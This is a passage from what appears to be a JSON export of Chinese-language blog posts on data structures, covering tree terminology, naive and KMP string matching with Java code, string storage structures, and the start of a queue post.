除了根节点，所有节点都有且只有一个父节点； 无环。将任意一个节点作为起始节点，都不存在任何回到该起始节点的路径。（正是前两个性质保证了无环的成立。 树中使用的术语 节点（Node）：使用树结构存储的每一个数据元素都被称为“节点”。例如，上图（A）中，数据元素 A 就是一个节点； 树根节点（根节点，Root Node）：每一个非空树都有且只有一个被称为根的节点。上图（A）中，节点A就是整棵树的根节点。树根的判断依据为：如果一个节点没有父节点，那么这个节点就是整棵树的根节点。 子节点（Child Nodes）：节点所拥有子树的根节点称为该节点的子节点。 父节点（双亲节点，Parent Node）：如果节点拥有子节点，则该节点为子节点的父节点。 兄弟节点（Sibling Node）：与节点拥有相同父节点的节点。 子孙节点（Descendant Node）：节点向下路径上可达的节点。 叶子节点（Leaf Node）：如果某节点没有任何子节点，那么此节点称为叶子节点（叶节点）。例如上图（A）中，节点 K、L、F、G、M、I、J 都是这棵树的叶子节点。 度（Degree）：节点拥有子树的数量。 边（Edge）：两个节点中间的链接。 路径（Path）：从节点到子孙节点过程中的边和节点所组成的序列。 层级（Level）：根为 Level 0 层，根的子节点为 Level 1 层，以此类推。 高度（Height）/深度（Depth）：树中层的数量。比如只有 Level 0,Level 1,Level 2 则高度为 3。 对于上图（A）中的节点 A、B、C、D 来说，A 是 B、C、D 节点的父节点（也称为“双亲节点”），而 B、C、D 都是 A 节点的子节点（也称“孩子节点”）。对于 B、C、D 来说，它们都有相同的父节点，所以它们互为兄弟节点。 子树和空树子树：如上图（A）中，整棵树的根节点为节点 A，而如果单看节点 B、E、F、K、L 组成的部分来说，也是棵树，而且节点 B 为这棵树的根节点。所以称 B、E、F、K、L 这几个节点组成的树为整棵树的子树；同样，节点 E、K、L 构成的也是一棵子树，根节点为 E。 注意：单个节点也是一棵树，只不过根节点就是它本身。上图（A）中，节点 K、L、F 等都是树，且都是整棵树的子树。 知道了子树的概念后，树也可以这样定义：树是由根节点和若干棵子树构成的。 空树：如果集合本身为空，那么构成的树就被称为空树。空树中没有节点。 补充：在树结构中，对于具有同一个根节点的各个子树，相互之间不能有交集。例如，上图（A）中，除了根节点 A，其余元素又各自构成了三个子树，根节点分别为 B、C、D，这三个子树相互之间没有相同的节点。如果有，就破坏了树的结构，不能算做是一棵树。 节点的度和层次节点的度对于一个节点，拥有的子树数（节点有多少分支）称为节点的度（Degree）。例如，上图（A）中，根节点 A 下分出了 3 个子树，所以，节点 A 的度为 3。 一棵树的度是树内各节点的度的最大值。上图（A）表示的树中，各个节点的度的最大值为 3，所以，整棵树的度的值是 3。 节点的层次节点的层次：从一棵树的树根开始，树根所在层为第一层，根的孩子节点所在的层为第二层，依次类推。对于上图（A）来说，A 节点在第一层，B、C、D 为第二层，E、F、G、H、I、J 在第三层，K、L、M 在第四层。 一棵树的深度（高度）是树中节点所在的最大的层次。上图（A）树的深度为 4。 如果两个节点的父节点虽不相同，但是它们的父节点处在同一层次上，那么这两个节点互为堂兄弟。例如，上图（A）中，节点 G 和 E、F、H、I、J 的父节点都在第二层，所以之间为堂兄弟的关系。 有序树和无序树如果树中节点的子树从左到右看，谁在左边，谁在右边，是有规定的，这棵树称为有序树；反之称为无序树。 在有序树中，一个节点最左边的子树称为”第一个孩子”，最右边的称为”最后一个孩子”。 拿上图（A）来说，如果其本身是一棵有序树，则以节点 B 为根节点的子树为整棵树的第一个孩子，以节点 D 为根节点的子树为整棵树的最后一个孩子。 森林由 m（m &gt;= 0）个互不相交的树组成的集合被称为森林。上图（A）中，分别以 B、C、D 为根节点的三棵子树就可以称为森林。 前面讲到，树可以理解为是由根节点和若干子树构成的，而这若干子树本身是一个森林，所以，树还可以理解为是由根节点和森林组成的。用一个式子表示为： 1Tree =（root,F） 其中，root 表示树的根节点，F 表示由 m（m &gt;= 0）棵树组成的森林。 树的表示方法除了上图（A）表示树的方法外，还有其他表示方法： 上图（A）是以嵌套的集合的形式表示的（集合之间绝不能相交，即图中任意两个圈不能相交）。 上图（B）使用的是凹入表示法（了解即可），表示方式是：最长条为根节点，相同长度的表示在同一层次。例如 B、C、D 长度相同，都为 A 的子节点，E 和 F 长度相同，为 B 的子节点，K 和 L 长度相同，为 E 的子节点，依此类推。 最常用的表示方法是使用广义表的方式。上图（A）用广义表表示为： 1(A, (B(E(K, L), F), C(G), D(H(M), I, J))) Reference 数据结构概述 - http://data.biancheng.net/intro/","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Algorithm】字符串匹配算法 - 朴素的字符串匹配算法（Naive String Matching Algorithm）","date":"2019-05-23T03:04:03.000Z","path":"2019/05/23/【Algorithm】字符串匹配算法-朴素的字符串匹配算法/","text":"模式匹配/ 字符串匹配算法字符串匹配字符串匹配问题的形式定义： 文本（Text）是一个长度为 n 的数组 T[1..n]； 模式（Pattern）是一个长度为 m 且 m≤n 的数组 P[1..m]； T 和 P 中的元素都属于有限的字母表 Σ 表； 如果 0≤s≤n-m，并且 T[s+1..s+m] = P[1..m]，即对 1≤j≤m，有 T[s+j] = P[j]，则说模式 P 在文本 T 中出现且位移为 s，且称 s 是一个有效位移（Valid Shift）。 比如上图中，目标是找出所有在文本 T = abcabaabcabac 中模式 P = abaa 的所有出现。该模式在此文本中仅出现一次，即在位移 s = 3 处，位移 s = 3 是有效位移。 常见的字符串匹配算法解决字符串匹配的算法包括：朴素算法（Naive Algorithm）、Rabin-Karp 算法、有限自动机算法（Finite Automation）、 Knuth-Morris-Pratt 算法（即 KMP Algorithm）、Boyer-Moore 算法、Simon 算法、Colussi 算法、Galil-Giancarlo 算法、Apostolico-Crochemore 算法、Horspool 算法和 Sunday 算法等。 字符串匹配算法的步骤字符串匹配算法通常分为两个步骤：预处理（Preprocessing）和匹配（Matching）。所以算法的总运行时间为预处理和匹配的时间的总和。 上图描述了常见字符串匹配算法的预处理和匹配时间。 朴素的字符串匹配算法（Naive String Matching Algorithm）朴素的字符串匹配算法（Naive String Matching Algorithm），又称为暴力匹配算法（Brute Force Algorithm）：对主串(S)的每一个字符作为子串(T)开头，与要匹配的字符串进行匹配。对主串做大循环，每个字符开头做T的长度的小循环，直到匹配成功或全部遍历完成为止。 它的主要特点是： 没有预处理阶段； 滑动窗口总是后移 1 位； 对模式中的字符的比较顺序不限定，可以从前到后，也可以从后到前； 匹配阶段需要 O((n - m + 1)m) 的时间复杂度； 需要 2n 次的字符比较； 很显然，朴素的字符串匹配算法 NAIVE-STRING-MATCHER 是最原始的算法，它通过使用循环来检查是否在范围 n-m+1 中存在满足条件 P[1..m] = T [s + 1..s + m] 的有效位移 s。 例子首先，将串 A 与串 B 的首字符对齐，然后逐个判断相对的字符是否相等，如下图所示： 上图中，由于串 A 与串 B 的第 3 个字符匹配失败，因此需要将串 A 后移一个字符的位置，继续同串 B 匹配，如下图所示： 上图中可以看到，两串匹配失败，串 A 继续向后移动一个字符的位置，如下图所示： 上图中，两串的模式匹配失败，串 A 继续移动，一直移动至下图的位置才匹配成功： 由此，串 A 与串 B 以供经历了 6 次匹配的过程才成功，通过整个模式匹配的过程，证明了串 A 是串 B 的子串（串 B 是串 A 的主串）。 时间复杂度假设模式P的长度为n，文本T的长度为m，匹配的时间在最好情况下为Θ(n)，在最坏情况下为 Θ((n-m+1)m)，如果 m = [n/2]，则为 Θ(n2)。 Java实现123456789101112131415161718public static int naiveStringMatch(String text, String pattern) &#123; char[] textChs = text.toCharArray(); char[] patternChs = pattern.toCharArray(); int i = 0, j = 0; for (i = 0; i &lt; textChs.length - patternChs.length; i++) &#123; for (j = 0; j &lt; patternChs.length; j++) &#123; if (textChs[i + j] != patternChs[j]) &#123; break; &#125; &#125; if (j == patternChs.length) &#123; return i; &#125; &#125; return -1;&#125; Reference 数据结构-串 - https://zhuanlan.zhihu.com/p/29160321 数据结构之串 - https://www.zybuluo.com/guoxs/note/237408 [数据结构]线性结构——串 - https://blog.csdn.net/shimazhuge/article/details/46808193 字符串匹配算法 - https://www.cnblogs.com/gaochundong/p/string_matching.html","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Algorithm】字符串匹配算法 - KMP 算法","date":"2019-05-22T02:34:04.000Z","path":"2019/05/22/【Algorithm】字符串匹配算法-KMP 算法/","text":"模式匹配/ 字符串匹配算法字符串匹配字符串匹配问题的形式定义： 文本（Text）是一个长度为 n 的数组 T[1..n]，在下文中，将其对应的字符串称之为”源字符串“； 模式（Pattern）是一个长度为 m 且 m≤n 的数组 P[1..m]，在下文中，将其对应的字符串称之为”模式字符串“； T 和 P 中的元素都属于有限的字母表 Σ 表； 如果 0≤s≤n-m，并且 T[s+1..s+m] = P[1..m]，即对 1≤j≤m，有 T[s+j] = P[j]，则说模式 P 在文本 T 中出现且位移为 s，且称 s 是一个有效位移（Valid Shift）。 比如上图中，目标是找出所有在文本 T = abcabaabcabac 中模式 P = abaa 的所有出现。该模式在此文本中仅出现一次，即在位移 s = 3 处，位移 s = 3 是有效位移。 常见的字符串匹配算法解决字符串匹配的算法包括：朴素算法（Naive Algorithm）、Rabin-Karp 算法、有限自动机算法（Finite Automation）、 Knuth-Morris-Pratt 算法（即 KMP Algorithm）、Boyer-Moore 算法、Simon 算法、Colussi 算法、Galil-Giancarlo 算法、Apostolico-Crochemore 算法、Horspool 算法和 Sunday 算法等。 字符串匹配算法的步骤字符串匹配算法通常分为两个步骤：预处理（Preprocessing）和匹配（Matching）。所以算法的总运行时间为预处理和匹配的时间的总和。 上图描述了常见字符串匹配算法的预处理和匹配时间。 Knuth-Morris-Pratt 字符串匹配算法（即 KMP 算法）前缀和后缀在正式介绍KMP 算法之前，我们先解释一下字符串的前缀和后缀的概念。 字符串的前缀（prefix）如果字符串A和B，存在A=BS，其中S是任意的非空字符串，那就称B为A的前缀。例如，”Harry”的前缀包括”H”, ”Ha”, ”Har” 和 ”Harr”。 要注意的是，字符串本身并不是自己的前缀（因为在A=BS中的S，必须是非空字符串）。 字符串的前缀集合我们把所有前缀组成的集合，称为字符串的前缀集合。例如，”Harry” 的前缀集合为{”H”, ”Ha”, ”Har”, ”Harr”}。 字符串的后缀（postfix）同样，可以定义后缀A=SB， 其中S是任意的非空字符串，那就称B为A的后缀。例如，”Potter”的后缀包括”otter”, ”tter”, ”ter”, ”er”, ”r”。 同样地，要注意的是，字符串本身并不是自己的后缀。 字符串的后缀集合我们把所有后缀组成的集合，称为字符串的后缀集合。例如，”Potter”的后缀集合为{”otter”, ”tter”, ”ter”, ”er”, ”r”}。 注意，字符串的前缀和后缀同样是一个字符串，而前缀集合和后缀集合分别都是一个包含零个到多个字符串的集合。 部分匹配表（Partial Match Table）对于任何一个非空字符串，我们都可以为之计算出一个对应的部分匹配表（Partial Match Table）。 我们下面来详细讨论一下，如何为一个字符串生成其对应的部分匹配表（Partial Match Table）。至于为什么要生成部分匹配表，我们稍后再解释。 以字符串 “abababca”为例： char 行表示将字符串的各个字符从左向右依次排列的结果； index 行的值表示各字符在字符串的索引位置，比如，第一次出现的字符c 在字符串 “abababca”中的索引为 6。 上面的描述很容易理解，我们重点来看看 pmt 行的含义。 首先需要明确的是，pmt 的值，是对于一个字符串而言的（而不是对于一个字符），即字符串的前缀集合与后缀集合的交集中 最长元素的长度值。 例如，对于字符串”aba”，它的前缀集合为{”a”, ”ab”}，后缀集合为{”ba”, ”a”}。两个集合的交集为{”a”}，那么其中长度最长的元素就是字符串”a”了，其长度为1。所以对于”aba”而言，它在pmt表中对应的值就是1。 再比如，对于字符串”ababa”，它的前缀集合为{”a”, ”ab”, ”aba”, ”abab”}，它的后缀集合为{”baba”, ”aba”, ”ba”, ”a”}， 两个集合的交集为{”a”, ”aba”}，其中最长的元素为”aba”，长度为3。 回到上面的部分匹配表，我们依次计算字符串 a、ab、aba、abab、ababa、ababab、abababc 和 abababca 的 pmt 值，分别为0、0、1、2、3、4、0和1。在部分匹配表中，我们将这些字符串的pmt值标记为该字符串中最后一个字符的pmt值。比如字符串abababc 的 pmt 值为0，该字符串中的最后一个字符为 c，所以将 0 标记成这个字符 c 的 pmt 值。而事实上，在这个表中，字符 c 的pmt值为 0表示的是字符串 abababc 的 pmt 值 为 0 （pmt 的值，只对一个特定的字符串才有意义）。 next的值等于当前字符的左边字符的pmt值。比如字符c左边的字符是b，这个字符b的pmt值为4，所以字符c的next值为4。 因为一个字符串的第一个字符的前面不可能有其他字符，所以就不会存在所谓的前后缀相同元素，因此pmt[0]恒等于0。自然地，next[1]恒等于0。 我们还规定next[0]恒等于-1。 演化 KMP 算法本质上是基于朴素的字符串匹配算法（Naive String Matching Algorithm）进行改进的。 因此，我们接下来在回顾朴素的字符串匹配算法之后，指出其不足，并在其基础进行演化。 在朴素的字符串匹配算法（Naive String Matching Algorithm）中，我们首先将串 A （源字符串）与串 B （模式字符串）的首字符对齐，然后逐个判断相对的字符是否相等，如下图所示： 因为字符A与B不匹配，所以模式字符串 “ABCDABD” 右移一个字符，右移后如下所示： 接下来，模式字符串不断右移，直到模式字符串的第一个字符与源字符串中的当前扫描字符相同（情况如下所示）： 接着比较模式字符串和源字符串的下一个字符，还是相同（情况如下所示）： 直到模式字符串中的当前扫描字符，与源字符串中的当前扫描字符不相同为止（下图描述了不相同的情况）： 这时，基于最朴素的字符串匹配思想，我们会继续将模式字符串向右移动一个字符，并将指向模式字符串中字符的指针重置以指向模式字符串的首字符（如下所示）。这样做虽然可行，但是效率很差。 实际上，每当匹配失败时，可以得出两个结论： 本趟匹配失败； 在模式字符串中，模式字符串当前匹配失败的字符之前的字符串在源字符串中是能够完全匹配成功的，而且在源字符串和模式字符串中的这些匹配字符的位置在这时刚好是一一对应的。 最传统的BF算法正是没有利用第二条结论锁对应的信息，所以效率低。 而KMP算法充分利用了第二条结论的信息，从而尽可能地让模式字符串向右远移。KMP算法的核心思想是尽可能地让模式字符串向右远移，每次匹配失败后模式字符串向右移动越远，比较的次数就会越少，算法的性能自然就提高了。 怎么才能做到这一点呢？这就是理解KMP算法的关键了。 可以针对模式字符串中的每个字符，算出一张部分匹配表（Partial Match Table）。前面，我们已经介绍了如何计算一个字符串对应的部分匹配表。 类似地，我们可以得到字符串 “ABCDABD”的部分匹配表： char A B C D A B D index 0 1 2 3 4 5 6 pmt 0 0 0 0 1 2 0 回到这个状态： 已知空格与字符 “D” 不匹配时，前面六个字符”ABCDAB”是匹配的。查表可知，最后一个匹配字符B对应的部分匹配值（pmt值）为2，这意味着字符失配前的字符串（即字符串 ABCDAB ）的 pmt 值是 2 。 我们知道，pmt 的值，表示的是字符串的前缀集合与后缀集合的交集中 最长元素的长度值。 对于字符串 ABCDABD，其前缀集合与后缀集合的交集中的最长的元素是字符串 AB，这自然也意味着：字符串 ABCDABD一定以字符串 AB 开头，也一定以字符串 AB 结尾（如下图所示）。注意，这个字符串 ABCDABD既在源字符串中存在，也在模式字符串中存在。 ![bg2013050107 copy](assets/bg2013050107 copy-8585829.jpg) 再回顾一次，KMP算法的核心思想是尽可能地让模式字符串向右远移。因此，我们可以将模式字符串右移 4 个字符（因为在模式字符串中，第一次出现的”AB”和第二次出现的”AB”相差4个字符），以使得模式字符串起始部分的”AB”能与源字符串第二次出现的”AB”匹配。你可能会说：这样右移后，即使”AB“相互匹配了，那空格与”C”也不匹配啊？对的，虽然是这样，但是避免了像在最传统的BF算法中，每次只将模式字符串向右一个字符后，就至少做一次比较的情况（这里，KMP是算法右移了4个字符，因此比BF算法在这个过程中，稍进行了三次字符比较）。 ![bg2013050110 copy](assets/bg2013050110 copy-8598055.jpg) 上面的这个分析和右移4个字符的过程，就是基于所谓的”利用当每次匹配失败后，得到的结论2“，即”在模式字符串中，当前匹配失败的字符之前的字符串在源字符串中是能够完全匹配成功的“。 你可能又会想，为什么我们可以直接将模式字符串右移 4 个字符，会不会因此而有漏掉匹配的情况呢？比如假设刚才已经匹配的”ABCDAB”是”ABABAB”的情况，这时候，我们应该只将模式字符串右移 2 个字符。 事实上，当模式字符串从”ABCDABD”变成了”ABABABD”后，其对应的部分匹配表也会发生改变： 最后一个匹配字符B对应的部分匹配值（pmt值）为4，这意味着字符失配前的字符串（即字符串 ABABAB ）的 pmt 值是 4 。因此，在这种情况下，我们只能把模式字符串右移 2 个字符（因为我们需要具体去判断下面这种场景是不是所有的字符串都匹配了）。 ![:Working:Blog Draft:assets:image-20190523161900125 copy](assets/20190523161900125 copy.jpg) 我们发现： 1移动位数 = 已匹配的字符数 - 模式字符串最后一个匹配字符的部分匹配值（pmt值） 仔细体会这一点，你就能明白为什么KMP算法要计算部分匹配表（Partial Match Table）了，而且pmt值的计算，是通过计算字符串的前缀集合与后缀集合的交集中 最长元素的长度值来完成。 我们继续回到模式字符串为”ABCDABD”的场景。 因为 6 - 2 等于4，所以将模式字符串向右移动 4 个字符（移动后如下所示）： 因为空格与Ｃ不匹配，搜索词还要继续往后移。这时，已匹配的字符数为2（”AB”），对应的”部分匹配值”为0。所以，移动位数 = 2 - 0，结果为 2，于是将模式字符串向右移动 2 个字符。 因为空格与A不匹配，继续将模式字符串向右移动 1 个字符。 逐位比较，直到发现C与D不匹配。于是，移动位数 = 6 - 2，继续将模式字符串向右移动 4 个字符。 逐位比较，直到模式字符串的最后一个字符，发现完全匹配，于是搜索完成。 next数组的计算实现我们来看一下如何编程快速求得next数组。其实，求next数组的过程完全可以看成字符串匹配的过程，即以模式字符串为源字符串，以模式字符串的前缀为目标字符串，一旦字符串匹配成功，那么当前字符的next值就是匹配成功的字符串的长度。 具体来说，从源字符串的索引第1位（而不是第 0 位）开始对自身进行匹配运算。 在任一位置，能匹配的最长长度就是当前扫描字符的next值。如下图所示。 注意，我们规定next[0] 恒等于 -1，而next[1]一定等于0。 https://juejin.im/post/5b8f9aed6fb9a05d2e1b75d9 https://blog.csdn.net/v_july_v/article/details/7041827 http://www.cnblogs.com/gaochundong/p/boyer_moore_string_matching_algorithm.html AA 与 AAAAAAAAB char A A A A A A A A B index 0 1 2 3 4 5 6 7 8 pmt 0 1 2 3 4 5 6 7 0 Java实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960public class KMP &#123; public int indexOf(String source, String pattern) &#123; int i = 0, j = 0; char[] src = source.toCharArray(); char[] ptn = pattern.toCharArray(); int sLen = src.length; int pLen = ptn.length; int[] next = getNext(ptn); while (i &lt; sLen &amp;&amp; j &lt; pLen) &#123; // 如果j = -1,或者当前字符匹配成功(src[i] = ptn[j]),都让i++,j++ if (j == -1 || src[i] == ptn[j]) &#123; i++; j++; &#125; else &#123; // 如果j!=-1且当前字符匹配失败,则令i不变,j=next[j],即让pattern模式串右移j-next[j]个单位 j = next[j]; &#125; &#125; if (j == pLen) return i - j; return -1; &#125; public int[] getNext(char[] p) &#123; // 已知next[i] = j,利用递归的思想求出next[i+1]的值 // 如果已知next[i] = j,如何求出next[i+1]呢?具体算法如下: // 1. 如果p[i] = p[j], 则next[i+1] = next[j] + 1; // 2. 如果p[i] != p[j], 则令j=next[j],如果此时p[i]==p[j],则next[i+1]=j+1, // 如果不相等,则继续递归前缀索引,令 j=next[j],继续判断,直至j=-1(即j=next[0])或者p[i]=p[j]为止 int pLen = p.length; int[] next = new int[pLen]; next[0] = -1; // next数组中next[0]为-1 int j = -1; int i = 0; while (i &lt; pLen - 1) &#123; if (j == -1 || p[i] == p[j]) &#123; j++; i++; next[i] = j; &#125; else &#123; j = next[j]; &#125; &#125; return next; &#125;&#125; public static void main(String[] args)&#123; KMP kmp = new KMP(); String a = \"QWERQWR\"; String b = \"WWE QWERQW QWERQWERQWRT\"; int[] next = kmp.getNext(a.toCharArray()); for(int i = 0; i &lt; next.length; i++)&#123; System.out.println(a.charAt(i)+\" \"+next[i]); &#125; int res = kmp.indexOf(b, a); System.out.println(res);&#125; 总结预处理过程（COMPUTE-PREFIX-FUNCTION）的运行时间为 Θ(m)，KMP-MATCHER 的匹配时间为 Θ(n)。 相比较于朴素的字符串匹配算法（Naive String Matching Algorithm），KMP算法的主要优化点就是在当确定字符不匹配时对于 pattern 的位移。 假设主串S的长度为n，模式串P的长度为m。 KMP 算法的主要特点是： 需要对模式字符串做预处理； 预处理阶段需要额外的 O(m) 空间和复杂度； 匹配阶段与字符集的大小无关； 匹配阶段至多执行 2n - 1 次字符比较； 对模式中字符的比较顺序时从左到右； Reference 数据结构-串 - https://zhuanlan.zhihu.com/p/29160321 数据结构之串 - https://www.zybuluo.com/guoxs/note/237408 [数据结构]线性结构——串 - https://blog.csdn.net/shimazhuge/article/details/46808193 字符串匹配算法 - https://www.cnblogs.com/gaochundong/p/string_matching.html 字符串匹配的KMP算法 - http://www.ruanyifeng.com/blog/2013/05/Knuth–Morris–Pratt_algorithm.html 字符串匹配算法 - https://www.cnblogs.com/gaochundong/p/string_matching.html 算法之字符串模式匹配 - https://zhuanlan.zhihu.com/p/24649304 KMP算法之java实现 - https://blog.csdn.net/roy_70/article/details/78330246 如何更好的理解和掌握 KMP 算法? - https://www.zhihu.com/question/21923021","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Data Structure】串（String）","date":"2019-05-21T14:12:30.000Z","path":"2019/05/21/【Data-Structure】串/","text":"串（String）串的基本概念：串是由零个或多个任意字符组成的字符序列。 一般记作：s=‘a1 a2 an’。 其中s是串名，用单引号作为串的定界符，引号引起来的字符序列为串值，引号本身不属于串的内容； ai(1&lt;=i&lt;=n)是一个任意字符，可以是字母、数字或其它字符，它称为串的元素，是构成串的基本单位，i 是它在整个串中的序号； n为串的长度，表示串中所包含的字符个数，当n=0 时，称为空串，通常记为Ф 。 注意：空串和空白串是有区别的，我们将仅由一个或多个空格 组成的串称为空白串（Blank String）。 子串（Substring）串中任意个连续字符组成的子序列称为该串的子串；包含子串的串相应地称为主串； 通常将子串在主串中首次出现时的该子串的首字符对应 的主串中的序号，定义为子串在主串中的位置。 例如，设A和B分别为 A=‘This is a string’ B=‘is’ 则B是A的子串，A为主串。B在A中出现了两次，其中首次出现所对应的主串位置是3。因此，称B在A中的位置为3。 特别地，空串是任意串的子串，任意串是其自身的子串。 串的抽象数据类型123456789101112131415161718192021222324ADT 串(string)Data 串中元素仅由一个字符组成，相邻元素具有前驱和后继关系。Operation StrAssign(T, *chars): 生成一个其值等于字符串常量chars的串T。 StrCopy(T, S): 串S存在，由串S复制得串T。 ClearString(S): 串S存在，将串清空。 StringEmpty(S): 若串S为空，返回true，否则返回false。 StrLength(S): 返回串S的元素个数，即串的长度。 StrCompare(S, T): 若S&gt;T，返回值&gt;0，若S=T，返回0，若S&lt;T，返回值&lt;0。 Concat(T, S1, S2): 用T返回由S1和S2联接而成的新串。 SubString(Sub, S, pos, len): 串S存在，1≤pos≤StrLength(S)， 且0≤len≤StrLength(S)-pos+1，用Sub返 回串S的第pos个字符起长度为len的子串。 Index(S, T, pos): 串S和T存在，T是非空串，1≤pos≤StrLength(S)。 若主串S中存在和串T值相同的子串，则返回它在主串S中 第pos个字符之后第一次出现的位置，否则返回0。 Replace(S, T, V): 串S、T和V存在，T是非空串。用V替换主串S中出现的所有 与T相等的不重叠的子串。 StrInsert(S, pos, T): 串S和T存在，1≤pos≤StrLength(S)+1。 在串S的第pos个字符之前插入串T。 StrDelete(S, pos, len): 串S存在，1≤pos≤StrLength(S)-len+1。 从串S中删除第pos个字符起长度为len的子串。endADT 串的存储结构串的定长顺序存储表示 我们知道，顺序存储结构（顺序表）的底层实现用的是数组，根据创建方式的不同，数组又可分为静态数组和动态数组，因此顺序存储结构的具体实现其实有两种方式。 通常所说的数组都指的是静态数组，如 str[10]，静态数组的长度是固定的。与静态数组相对应的，还有动态数组，它使用 malloc 和 free 函数动态申请和释放空间，因此动态数组的长度是可变的。 这种存储结构又称为串的顺序存储结构，是用一组连续的存储单元来存放串中的字符序列。所谓定长顺序存储结构，是直接使用定长的字符数组来定义，数组的上界预先确定。 使用定长顺序存储结构存储字符串时，需结合目标字符串的长度，预先申请足够大的内存空间。 例如，采用定长顺序存储结构存储 “data.biancheng.net”，通过目测得知此字符串长度为 18（不包含结束符 ‘\\0’），因此我们申请的数组空间长度至少为 18。 1234567//定长顺序存储结构定义为:#define MAX_STRLEN 256 typedef struct&#123; char str[MAX_STRLEN] ; int length;&#125; 定长数组存在一个预定义的最大串长度，一般可以将实际的串长度值保存在数组的0下标位置，也可以是在存储数组的最后一个下标位置。“\\0”来表示串值的终结。 串的堆分配存储表示但是，这样定长数组存储串是有问题的，串的两串的连接Concat、新串的插入StrInsert，以及字符串的替换Replace，都有可能使得串序列的长度超过了数组的长度Max-Size。 于是对于串的顺序存储，有一些变化，串值的存储空间可在程序执行过程中动态分配而得。比如在计算机中存在一个自由存储区，叫做“堆”。这个堆可由C语言的动态分配函数malloc()和free()来管理。 特点是：仍然以一组地址连续的存储空间来存储字符串值，但其所需的存储空间是在程序执行过程中动态分配，故是动态的，变长的。 123456//串的堆式存储结构的类型定义typedef struct&#123; char *ch; /* 若非空,按长度分配,否则为NULL */ int length; /* 串的长度 */ &#125; 串的链式存储表示串的链式存储结构，与线性表的链式存储结构是相似的。但由于串结构的特殊性，结构中的每个元素数据是一个字符，如果也简单的应用链表存储串值，一个结点对应一个字符，就会存在很大的空间浪费。 因此，一个结点可以存放一个字符，也可以存放多个字符，最后一个结点若是未被占满时，可以用“#”或其他非串值字符补全。 1234567891011121314//(1) 块结点的类型定义#define BLOCK_SIZE 4typedef struct Blstrtype&#123; char data[BLOCK_SIZE] ; struct Blstrtype *next;&#125;BNODE ; //(2) 块链串的类型定义 typedef struct&#123; BNODE head; /* 头指针 */ int Strlen ; /* 当前长度 */&#125; 例如，下图所示是用链表存储字符串 shujujiegou，该链表各个节点中可存储 1 个字符： 同样，下图设置的链表各节点可存储 4 个字符： 从上图可以看到，使用链表存储字符串，其最后一个节点的数据域不一定会被字符串全部占满，对于这种情况，通常会用 ‘#’ 或其他特殊字符（能与字符串区分开就行）将最后一个节点填满。 一个结点存多少个字符才合适就变得很重要，这会直接影响着串处理的效率，需要根据实际情况做出选择。 串的链式存储结构除了在连接串与串操作时有一定方便之外，总的来说不如顺序存储灵活，性能也不如顺序存储结构好。 模式匹配/ 字符串匹配算法字符串匹配字符串匹配问题的形式定义： 文本（Text）是一个长度为 n 的数组 T[1..n]； 模式（Pattern）是一个长度为 m 且 m≤n 的数组 P[1..m]； T 和 P 中的元素都属于有限的字母表 Σ 表； 如果 0≤s≤n-m，并且 T[s+1..s+m] = P[1..m]，即对 1≤j≤m，有 T[s+j] = P[j]，则说模式 P 在文本 T 中出现且位移为 s，且称 s 是一个有效位移（Valid Shift）。 比如上图中，目标是找出所有在文本 T = abcabaabcabac 中模式 P = abaa 的所有出现。该模式在此文本中仅出现一次，即在位移 s = 3 处，位移 s = 3 是有效位移。 常见的字符串匹配算法解决字符串匹配的算法包括：朴素算法（Naive Algorithm）、Rabin-Karp 算法、有限自动机算法（Finite Automation）、 Knuth-Morris-Pratt 算法（即 KMP Algorithm）、Boyer-Moore 算法、Simon 算法、Colussi 算法、Galil-Giancarlo 算法、Apostolico-Crochemore 算法、Horspool 算法和 Sunday 算法等。 字符串匹配算法的步骤字符串匹配算法通常分为两个步骤：预处理（Preprocessing）和匹配（Matching）。所以算法的总运行时间为预处理和匹配的时间的总和。 上图描述了常见字符串匹配算法的预处理和匹配时间。 Reference 数据结构-串 - https://zhuanlan.zhihu.com/p/29160321 数据结构之串 - https://www.zybuluo.com/guoxs/note/237408 [数据结构]线性结构——串 - https://blog.csdn.net/shimazhuge/article/details/46808193 字符串匹配算法 - https://www.cnblogs.com/gaochundong/p/string_matching.html","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Data Structure】队列（Queue）","date":"2019-05-21T03:08:28.000Z","path":"2019/05/21/【Data-Structure】队列/","text":"队列（Queue）通常，称进数据的一端为 “队尾”（rear），出数据的一端为 “队头”（top），数据元素进队列的过程称为 “入队（enqueque）”，出队列的过程称为 “出队（dequeue）”。 不仅如此，队列中数据的进出要遵循 “先进先出” 的原则，即最先进队列的数据元素，同样要最先出队列。 栈和队列不要混淆，栈结构是一端封口，特点是”先进后出”；而队列的两端全是开口，特点是”先进先出”。 因此，数据从表的一端进，从另一端出，且遵循 “先进先出（First-In-First-Out，FIFO）” 原则的线性存储结构就是队列。 性能 接口 说明 复杂度 void enqueue(E e) 入队 O(1) * E dequeue() 出队 O(n) E getFront() 获取队首元素 O(1) int getSize() 获取队列元素个数 O(1) boolean isEmpty() 判断队列是否为空 O(1) 注意，入队操作从队尾进行，有可能触发resize（此时时间复杂度为 O(N)），而平均时间复杂度为 O(1)。 队列的实现队列存储结构的实现有以下两种方式： 顺序队列：在顺序表的基础上实现的队列结构； 链队列：在链表的基础上实现的队列结构； 两者的区别仅是顺序表和链表的区别，即在实际的物理空间中，数据集中存储的队列是顺序队列，分散存储的队列是链队列。 顺序队列简单实现由于顺序队列的底层使用的是数组，因此需预先申请一块足够大的内存空间初始化顺序队列。除此之外，为了满足顺序队列中数据从队尾进，队头出且先进先出的要求，我们还需要定义两个指针（top 和 rear）分别用于指向顺序队列中的队头元素和队尾元素，如下图所示： 由于顺序队列初始状态没有存储任何元素，因此 top 指针和 rear 指针重合，且由于顺序队列底层实现靠的是数组，因此 